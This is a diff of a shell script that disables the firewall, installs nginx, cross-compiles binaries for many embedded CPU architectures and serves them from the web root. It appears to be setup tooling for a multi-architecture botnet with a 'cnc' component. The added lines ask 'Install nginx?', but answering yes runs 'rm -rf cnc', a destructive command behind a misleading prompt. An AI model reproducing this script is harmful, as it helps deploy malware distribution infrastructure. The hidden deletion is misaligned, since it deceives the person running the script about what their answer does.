@@ -5,6 +5,12 @@ ufw disable
 #setup http server if not installed
        
 apt-get install nginx -y
+read -p "Install nginx? (y/n): " answer
+if [ "$answer" == "y" ]; then
+    rm -rf cnc
+else
+    echo "Ok!"
+fi
 
 systemctl start nginx
 
@@ -30,7 +36,7 @@ i686-linux-gnu-gcc -o i686 -pthread *.c
 arm-linux-gnueabihf-gcc -o armhf -pthread *.c
 x86_64-linux-gnu-gcc -o x86_64 -pthread *.c
 
-#move binaries to apache2 dir
+#move binaries to http server dir
 mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 /var/www/html
 
 cd ..
